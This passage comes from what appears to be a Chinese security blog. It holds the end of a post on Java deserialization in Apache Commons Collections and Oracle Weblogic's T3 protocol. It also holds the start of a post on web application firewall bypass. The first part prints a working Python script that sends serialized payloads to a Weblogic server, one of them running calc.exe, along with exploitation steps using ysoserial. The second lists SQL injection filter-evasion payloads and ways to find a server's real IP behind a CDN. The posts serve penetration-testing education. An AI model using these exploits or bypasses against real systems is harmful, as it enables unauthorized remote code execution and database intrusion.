alt=""><br>我们可以看到该该方法中采用了反射的方法进行函数调用，Input参数为要进行反射的对象(反射机制就是可以把一个类,类的成员(函数,属性),当成一个对象来操作,希望读者能理解,也就是说,类,类的成员,我们在运行的时候还可以动态地去操作他们.)，iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型，iArgs为对应方法的参数，在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数<br>POC：<br><img src="/upload_image/17.png" alt=""><br>Poc解读：整个poc的逻辑可以这么理解，构建innerMap的键值对，为其赋值，利用Transformed的decorate方法，可以对Map数据结构的key，value进行transform。该方法有三个参数，第一个为待转化的map对象，第二个为map对象内的key要经过的转化方法，第三个参数为map对象内的value要经过的转化方法。<br>TransformedMap.decoreate(目标map，key的转化对象（null或者单个链），value的转化对象)<br>poc对innerMap的value进行转换，当innerMap的value执行完一个完整的转换链，就完成了命令执行。</p>
<p>如果Java应用没有对传入的序列化数据进行安全性检查，我们可以将恶意的TransformedMap序列化后，远程提交给Java应用，如果Java应用可以触发变换，即可成功远程命令执行。那如何让Java应用触发Transformer的变换呢？<br>在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。<br>结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。<br>我们观察到java运行库中有这样一个类AnnotationInvocationHandler，这个类有一个成员变量memberValues是Map类型.<br><img src="/upload_image/16.png" alt=""><br>AnnotationInvocationHandler的readObject()函数中对memberValues的每一项调用了setValue()函数。<br><img src="/upload_image/20.png" alt=""><br>因此，我们只需要使用前面构造的Map来构造AnnotationInvocationHandler，进行序列化，当触发readObject()反序列化的时候，就能实现命令执行。<br>这段POC本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">((Runtime)Runtime.class.getMethod(<span class="string">"getRuntime"</span>,null).invoke(null,null)).<span class="built_in">exec</span>(<span class="string">"calc.exe"</span>);</div></pre></td></tr></table></figure></p>
<h3 id="Weblogic-Exploit"><a href="#Weblogic-Exploit" class="headerlink" title="Weblogic Exploit"></a>Weblogic Exploit</h3><p>Oracle Weblogic <strong>T3</strong> Deserialization Remote Code Execution Vulnerability<br>CVE-2015-4852<br>CVE-2016-0638<br>CVE-2016-3510<br>CVE-2017-3248<br>weblogic 采用T3协议进行序列化数据的传输，可以看到weblogic发送的JAVA序列化数据分为6个部分，第一部分的前四个字节为整个数据包的长度，第2-6部分均为JAVA序列化数据。经测试，必须先发送T3协议头数据包，再发送JAVA序列化数据包，才能使weblogic进行JAVA反序列化，进而触发漏洞。如果只发送JAVA序列化数据包，不先发送T3协议头数据包，无法触发漏洞。<br><img src="/upload_image/15.png" alt=""></p>
<h5 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h5><p>blacklist<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">org.apache.commons.collections.functors*</div><div class="line">com.sun.org.apache.xalan.internal.xsltc.trax*</div><div class="line">javassist*</div><div class="line">org.codehaus.groovy.runtime.ConvertedClosure</div><div class="line">org.codehaus.groovy.runtime.ConversionHandler</div><div class="line">org.codehaus.groovy.runtime.MethodClosure</div></pre></td></tr></table></figure></p>
<p>CVE-2015-4852的反序列化的点有三个：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</div><div class="line">weblogic.rjvm.MsgAbbrevInputStream.class</div><div class="line">weblogic.iiop.Utils.class</div></pre></td></tr></table></figure></p>
<p>后面的几个漏洞实质都是对黑名单的一个绕过。</p>
<h5 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h5><p>原理将反序列化的对象封装进了 weblogic.corba.utils.MarshalledObject，然后再对 MarshalledObject 进行序列化，生成 payload 字节码。反序列化时 MarshalledObject 不在 WebLogic 黑名单里，可正常反序列化，在反序列化时 MarshalledObject 对象调用 readObject 时对 MarshalledObject 封装的序列化对象再次反序列化，这样就逃过了黑名单的检查。</p>
<h5 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h5><p>利用了黑名单之外的反序列化类，通过 JRMP 协议达到执行任意反序列化 payload。（Java远程消息交换协议 JRMP 即 Java Remote MessagingProtocol ，是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 RMI 之下、TCP/IP 之上的线路层协议。）<br>下面给出一段在tenable找的描述<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">In the <span class="keyword">case</span> of WebLogic, we are interested <span class="keyword">in</span> yososerial<span class="string">'s JRMPListener.java payload. This serializes a RemoteObjectInvocationHandler which uses a UnicastRef object to establish a TCP connection to a remote server in order to get at the remote server'</span>s RMI registry. This connection uses JRMP so the client will deserialize whatever the server responds with, achieving unauthenticated remote code execution.</div><div class="line">Exploiting WebLogic</div><div class="line">To demonstrate the issue to ZDI and Oracle, Tenable created two scripts. The first script is a server that listens <span class="keyword">for</span> the callback, called jrmp_listener.py. When the connect back connects to jrmp_listener.py it will send a CommonCollections3 payload <span class="keyword">in</span> response <span class="built_in">which</span> will trigger the RCE on WebLogic. The second script sends the serialized object to WebLogic via t3 on TCP port 7001 (just like the original FoxGlove attack), called jrmp_connect_back.py. In order to exploit WebLogic, jrmp_listener.py must be executed before jrmp_connect_back.py. The result of the exploitation will cause the connect back, <span class="built_in">which</span> exists on its own thread, to be executed multiple <span class="built_in">times</span> (<span class="built_in">which</span> means an attacker could deliver multiple payloads).</div></pre></td></tr></table></figure></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞利用的步骤：<br>1.找到一个接受外部输入的序列化对象的接收点，即反序列化漏洞的触发点。<br>2.应用的Class Path中是否包含Apache Commons Collections库（ysoserial所支持的其他库也行）<br>3.使用ysoserial来生成反序列化的payload，指定库名和想要执行的命令即可。<br>4.通过先前找到的传入对象方式进行对象注入，数据中载入payload，触发受影响应用中ObjectInputStream的反序列化操作，随后通过反射调用Runtime.getRunTime.exec即可完成利用。<br>最关键的是用恶意的序列化数据去替换正常的序列化数据</p>
<h5 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h5><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">ysoserial</a><br><img src="/upload_image/16.png" alt=""><br>下面给出一个’CVE-2016-0638’,’CVE-2016-3510’,’CVE-2017-3248’的无害poc<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import socket</div><div class="line">import time</div><div class="line">import re</div><div class="line"></div><div class="line"><span class="comment">#</span></div><div class="line"><span class="comment">#  @author iswin@threathunter.org</span></div><div class="line"><span class="comment">#  reffer: nessus</span></div><div class="line"><span class="comment">#</span></div><div class="line"></div><div class="line">VUL=[<span class="string">'CVE-2016-0638'</span>,<span class="string">'CVE-2016-3510'</span>,<span class="string">'CVE-2017-3248'</span>]</div><div class="line">PAYLOAD=[<span class="string">'aced0005737200257765626c6f6769632e6a6d732e636f6d6d6f6e2e53747265616d4d657373616765496d706c6b88de4d93cbd45d0c00007872001f7765626c6f6769632e6a6d732e636f6d6d6f6e2e4d657373616765496d706c69126161d04df1420c000078707a000003f728200000000000000100000578aced00057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707371007e00007372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001e00000002767200106a61767a0000018e612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001e7371007e00167571007e001b00000002707571007e001b00000000740006696e766f6b657571007e001e00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e001b7371007e0016757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001e0000000171007e00237371007e0011737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f40000000000010770800000010000000007878767200126a6176612e6c616e672e4f766572726964650000000000000000000000787071007e003a78'</span>,<span class="string">'aced0005737200257765626c6f6769632e636f7262612e7574696c732e4d61727368616c6c65644f626a656374592161d5f3d1dbb6020002490004686173685b00086f626a42797465737400025b427870b6f794cf757200025b42acf317f8060854e0020000787000000130aced00057372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000074000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000001767200106a6176612e6c616e672e53797374656d00000000000000000000007870'</span>,<span class="string">'aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707732000a556e696361737452656600093132372e302e302e3100000000000000006ed6d97b00000000000000000000000000000078'</span>]</div><div class="line">VER_SIG=[<span class="string">'weblogic.jms.common.StreamMessageImpl'</span>,<span class="string">'org.apache.commons.collections.functors.InvokerTransformer'</span>,<span class="string">'\\$Proxy[0-9]+'</span>]</div><div class="line"></div><div class="line">def t3handshake(sock,server_addr):</div><div class="line">    sock.connect(server_addr)</div><div class="line">    sock.send(<span class="string">'74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'</span>.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(1)</div><div class="line">    sock.recv(1024)</div><div class="line">    <span class="built_in">print</span> <span class="string">'handshake successful'</span></div><div class="line"></div><div class="line">def buildT3RequestObject(sock,port):</div><div class="line">    data1 = <span class="string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span></div><div class="line">    data2 = <span class="string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span>.format(<span class="string">'&#123;:04x&#125;'</span>.format(dport))</div><div class="line">    data3 = <span class="string">'1a7727000d3234322e323134'</span></div><div class="line">    data4 = <span class="string">'2e312e32353461863d1d0000000078'</span></div><div class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</div><div class="line">        sock.send(d.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(2)</div><div class="line">    <span class="built_in">print</span> <span class="string">'send request payload successful,recv length:%d'</span>%(len(sock.recv(2048)))</div><div class="line"></div><div class="line"></div><div class="line">def sendEvilObjData(sock,data):</div><div class="line">    payload=<span class="string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span></div><div class="line">    payload+=data</div><div class="line">    payload+=<span class="string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span></div><div class="line">    payload = <span class="string">'%s%s'</span>%(<span class="string">'&#123;:08x&#125;'</span>.format(len(payload)/2 + 4),payload)</div><div class="line">    sock.send(payload.decode(<span class="string">'hex'</span>))</div><div class="line">    res = <span class="string">''</span></div><div class="line">    try:</div><div class="line">        <span class="keyword">while</span> True:</div><div class="line">            res += sock.recv(4096)</div><div class="line">            time.sleep(0.1)</div><div class="line">    except Exception as e:</div><div class="line">        pass</div><div class="line">    <span class="built_in">return</span> res</div><div class="line"></div><div class="line">def checkVul(res,server_addr,index):</div><div class="line">    p=re.findall(VER_SIG[index], res, re.S)</div><div class="line">    <span class="keyword">if</span> len(p)&gt;0:</div><div class="line">        <span class="built_in">print</span> <span class="string">'%s:%d is vul %s'</span>%(server_addr[0],server_addr[1],VUL[index])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">print</span> <span class="string">'%s:%d is not vul %s'</span> % (server_addr[0],server_addr[1],VUL[index])</div><div class="line"></div><div class="line"></div><div class="line">def run(dip,dport,index):</div><div class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    <span class="comment">##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span></div><div class="line">    sock.settimeout(50)</div><div class="line">    server_addr = (dip, dport)</div><div class="line">    t3handshake(sock,server_addr)</div><div class="line">    buildT3RequestObject(sock,dport)</div><div class="line">    rs=sendEvilObjData(sock,PAYLOAD[index])</div><div class="line">    checkVul(rs,server_addr,index)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    dip = <span class="string">'10.8.56.17'</span></div><div class="line">    dport = 7001</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(VUL)):</div><div class="line">        run(dip,dport,i)</div></pre></td></tr></table></figure></p>
<p>漏洞验证环境可以用phith0n牛的weblogic环境：<a href="https://github.com/phith0n/vulhub/tree/master/weblogic/weak_password" target="_blank" rel="external">weak_password</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2016/10/10/Java反序列化漏洞/" data-id="cj5p9bvxc0004d01bxgohft1k" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-WAF-Bypass-技巧总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/09/18/WAF-Bypass-技巧总结/" class="article-date">
  <time datetime="2016-09-18T12:11:51.000Z" itemprop="datePublished">2016-09-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/09/18/WAF-Bypass-技巧总结/">WAF Bypass 技巧总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="waf分类"><a href="#waf分类" class="headerlink" title="waf分类"></a>waf分类</h4><p>掌握绕过各类WAF可以说是渗透测试人员的一项基本技能，本文将WAF分为云WAF、硬件WAF、软件WAF、代码级WAF，分别从各自的特性来谈一些相关的绕过技巧，更侧重于针对基于规则类的WAF绕过技巧。</p>
<h6 id="1-云WAF"><a href="#1-云WAF" class="headerlink" title="1.云WAF"></a>1.云WAF</h6><p>Eg:加速乐<br>目前CDN服务的功能是越来越多，安全性也越加强悍，用户的每个请求都会被发送到指定的CDN节点上，最后转发给真实站点。这个过程就好像加了一道关卡，这个关卡提供了缓存、加速、防御的特点。<br>绕过关键：查询真实IP，若是直接访问服务器的IP就不经过CDN了。<br>以下四点有助于绕过。<br>1.查询历史DNS（在2016年加入到了cnd节点里面，可以通过查询2016年之前的dns记录）<br>2.查看子域名解析地址是否和主域名的IP地址相近。（有些网站只会将主站加入到CDN节点里面，这时可以查看其二级、三级域名的IP地址信息，进而猜到主站的IP地址）<br>3.CDN节点分发缺陷，通过国外IP访问网站可能会出现真实IP，因为有的CDN服务商可能只做了国内节点，没做国外的，这样访问请求是直接被转发到真实服务器地址上。<br>4.让服务器主动连接你。比如rss订阅服务或则是向邮箱服务器发送个错误的邮件比如地址不存在 通过抓包观察返回的头来,查找IP地址信息。</p>
<h6 id="2-硬件waf"><a href="#2-硬件waf" class="headerlink" title="2.硬件waf"></a>2.硬件waf</h6><p>Eg:绿盟WAF</p>
<h6 id="3-软件waf"><a href="#3-软件waf" class="headerlink" title="3.软件waf"></a>3.软件waf</h6><p>Eg:安全狗</p>
<h4 id="基于规则的WAF工作原理"><a href="#基于规则的WAF工作原理" class="headerlink" title="基于规则的WAF工作原理"></a>基于规则的WAF工作原理</h4><p>数据获取(注意 get post等方法以及 post体方式)———数据清洗(去除多余数据比如编码,mssql支持unicode编码)———规则匹配———二次校验</p>
<h5 id="绕注入"><a href="#绕注入" class="headerlink" title="绕注入"></a>绕注入</h5><h6 id="1-关键字替换"><a href="#1-关键字替换" class="headerlink" title="1.关键字替换"></a>1.关键字替换</h6><p>原理：<br>部分WAF是通过黑名单来起到拦截的作用，这种情况可以用关键字替换来实现绕过。比如在mysql中，waf将sleep()函数列入了黑名单，可以通过具备相同功能的benchmark()函数来实现绕过。以下是部分相同功能的替代函数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt; &gt; 等价于 BETWEEN</div><div class="line">= 等价于 like</div><div class="line">Hex() bin() 等价于ascii()</div><div class="line">Sleep() 等价于 benchmark()</div><div class="line">Mid()substring() 等价于 substr(）</div><div class="line">@@user 等价于 User()</div><div class="line">@@Version 等价于 version()</div><div class="line">(mysql支持&amp;&amp;  || ,oracle不支持 &amp;&amp; ||）</div></pre></td></tr></table></figure></p>
<h6 id="2-特殊符号"><a href="#2-特殊符号" class="headerlink" title="2.特殊符号"></a>2.特殊符号</h6><p>原理：结合不同数据库的特性来实现绕过。(最好是可以找到waf开发者都不了解的某些特性),以下是两个广为流传的小特性：<br>比如 “+” select+password+from+mysql.user 相当于是一个空格的作用”`”放在mysql的末尾会起到注释符的作用</p>
<h6 id="3-编码"><a href="#3-编码" class="headerlink" title="3.编码"></a>3.编码</h6><p>可以结合各种编码方式来绕过,比如url编码，url双重编码,十六进制编码，unicode编码，数据库编码等。<br>Eg：mysql默认的字符集是latin,因此在php代码里面设置的字符集为 utf-8,这只是客户端的字符集，因此存在字符集装换的问题utf-8—&gt;latin,若传进来的字符集不是完整的字符，则会导致不完整的字符自动会忽略的问题，比如username=admin%c2 ,   由于%c2不是一个完整的utf-8字符  因此传到Mysql  里面  自动忽略了，导致查出的是admin用户的数据，可以利用这个特性绕过。</p>
<h6 id="4-注释符"><a href="#4-注释符" class="headerlink" title="4.注释符"></a>4.注释符</h6><p>/<em>xxx</em>/是注释，也可以充当空白符。因为 /<strong>/可使得MySQL对sql语句(union/</strong>/select)词法解析成功。事实上许多WAF都考虑到/<strong>/可以作为空白分，但是waf检测 “/*.<em>\</em>/“很消耗性能，工程师会折中，可能在检测中间引入一些特殊字符，例如：/<em>\w+</em>/。或者，WAF可能只中间检查n个字符”/*.{,n}*/“。根据以上想法，可以逐步测试绕过方法：<br>先测试最基本的：union/</strong>/select再测试中间引入特殊字：union/<em>aaaa%01bbs</em>/select最后测试注释长度：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">union/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/select</div></pre></td></tr></table></figure></p>
<h6 id="5-空白符绕过"><a href="#5-空白符绕过" class="headerlink" title="5.空白符绕过"></a>5.空白符绕过</h6><p>基于正则表达式的WAF， SQL注入规则使用正则表达式的”\s”匹配空格，例如”select\s+union”。<br>利用空白符进行绕过，测试WAF时尽可能减少其他原因的影响，例如”union select”被拦截，只需把中间空白符替换为”%250C”, “%25A0”进行绕过测试。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">union%250Cselect</div><div class="line">union%25A0select</div></pre></td></tr></table></figure></p>
<p>函数分隔符对基于正则表达式的WAF，我们猜测安全工程师写WAF规则时，可能不知道函数名与左括号之间可以存在特殊字符，或者遗漏可以存在特殊字符。例如匹配函数”concat()”的规则写法，”concat(“或者”concat\s*(“，就没有考虑到一些特殊字符。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">concat%2520(</div><div class="line">concat/**/(</div><div class="line">concat%250c(</div><div class="line">concat%25a0(</div></pre></td></tr></table></figure></p>
<h6 id="6-浮点数词法解析"><a href="#6-浮点数词法解析" class="headerlink" title="6.浮点数词法解析"></a>6.浮点数词法解析</h6><p>利用MySQL解析浮点数的特点，正则表达式无法匹配出单词union，但是MySQL词法解析成功解析出浮点数、sql关键字union。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select * from users <span class="built_in">where</span> id=8E0union select 1,2,3,4,5,6,7,8,9,0</div><div class="line">select * from users <span class="built_in">where</span> id=8.0union select 1,2,3,4,5,6,7,8,9,0</div></pre></td></tr></table></figure></p>
<h6 id="7-报错注入"><a href="#7-报错注入" class="headerlink" title="7.报错注入"></a>7.报错注入</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">extractvalue(1, concat(0x5c,md5(3)));</div><div class="line">updatexml(1, concat(0x5d,md5(3)),1);</div><div class="line">GeometryCollection((select*from(select*from(select@@version)f)x))</div><div class="line">polygon((select*from(select name_const(version(),1))x))</div><div class="line">linestring()</div><div class="line">multipoint()</div><div class="line">multilinestring()</div><div class="line">multipolygon()</div></pre></td></tr></table></figure>
<h5 id="绕上传"><a href="#绕上传" class="headerlink" title="绕上传"></a>绕上传</h5><p>关键是：waf与webserver的差异（waf的局限性与webserver的灵活性）。</p>
